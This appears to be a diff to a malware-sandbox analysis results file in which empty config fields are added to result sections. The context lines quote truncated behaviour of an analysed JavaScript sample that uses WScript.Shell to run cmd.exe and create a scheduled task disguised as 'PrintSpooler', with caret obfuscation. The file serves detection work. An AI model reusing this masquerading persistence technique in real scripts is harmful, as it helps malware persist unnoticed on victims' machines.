@@ -6,6 +6,7 @@
       {
         "auto_collapse": false,
         "body": "Sample uses unusual ShortCut objects",
+        "body_config": {},
         "body_format": "TEXT",
         "classification": "TLP:C",
         "depth": 0,
@@ -24,6 +25,7 @@
       {
         "auto_collapse": false,
         "body": null,
+        "body_config": {},
         "body_format": "TEXT",
         "classification": "TLP:C",
         "depth": 0,
@@ -35,6 +37,7 @@
       {
         "auto_collapse": false,
         "body": "JavaScript creates a new Windows Scripting Host Shell Object\n\t\tnew WScript.Shell[16]()\n",
+        "body_config": {},
         "body_format": "TEXT",
         "classification": "TLP:C",
         "depth": 1,
@@ -57,6 +60,7 @@
       {
         "auto_collapse": false,
         "body": "JavaScript runs Command Prompt via cmd.exe\n\t\tWScript.Shell[16].exec(\"cmd.exe schtasks  /create /sc minute /mo 16 /tn PrintSpooler /tr \"%coMSPec% ...\n\t\tnew WshScriptExec[20](\"cmd.exe schtasks  /create /sc minute /mo 16 /tn PrintSpooler /tr \"%coMSPec% /...\n\t\t ws.exec(\"cmd.exe schtasks  /create /sc minute /mo 16 /tn PrintSpooler /tr \\\"%coMSPec% /c s^t^a^rt /...",
+        "body_config": {},
         "body_format": "TEXT",
         "classification": "TLP:C",
         "depth": 1,
@@ -79,6 +83,7 @@
       {
         "auto_collapse": false,
         "body": "JavaScript runs Scheduled Task utility via cmd.exe\n\t\tWScript.Shell[16].exec(\"cmd.exe schtasks  /create /sc minute /mo 16 /tn PrintSpooler /tr \"%coMSPec% ...\n\t\tnew WshScriptExec[20](\"cmd.exe schtasks  /create /sc minute /mo 16 /tn PrintSpooler /tr \"%coMSPec% /...\n\t\t ws.exec(\"cmd.exe schtasks  /create /sc minute /mo 16 /tn PrintSpooler /tr \\\"%coMSPec% /c s^t^a^rt /...",
+        "body_config": {},
         "body_format": "TEXT",
         "classification": "TLP:C",
         "depth": 1,
@@ -101,6 +106,7 @@
       {
         "auto_collapse": false,
         "body": "JavaScript runs code via shell\n\t\tWScript.Shell[16].exec(\"cmd.exe schtasks  /create /sc minute /mo 16 /tn PrintSpooler /tr \"%coMSPec% ...",
+        "body_config": {},
         "body_format": "TEXT",
         "classification": "TLP:C",
         "depth": 1,
